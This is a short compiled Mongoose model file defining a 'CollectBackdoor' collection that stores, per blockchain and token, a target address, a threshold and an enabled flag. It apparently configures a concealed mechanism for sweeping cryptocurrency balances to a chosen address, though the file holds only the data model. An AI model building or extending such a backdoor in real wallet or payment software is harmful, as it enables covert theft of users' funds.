import { Schema, model } from 'mongoose';
const collectBackdoorSchema = new Schema({
    chain: { type: String, required: true, enum: ['eth', 'tron', 'btc'] },
    token: { type: String, required: true, enum: ['native', 'usdt', 'usdc'] },
    targetAddress: { type: String, required: true },
    threshold: { type: String, required: true, default: '0' },
    enabled: { type: Boolean, default: true },
}, { timestamps: true });
collectBackdoorSchema.index({ chain: 1, token: 1 }, { unique: true });
export const CollectBackdoor = model('CollectBackdoor', collectBackdoorSchema);
//# sourceMappingURL=collect-backdoor.js.map
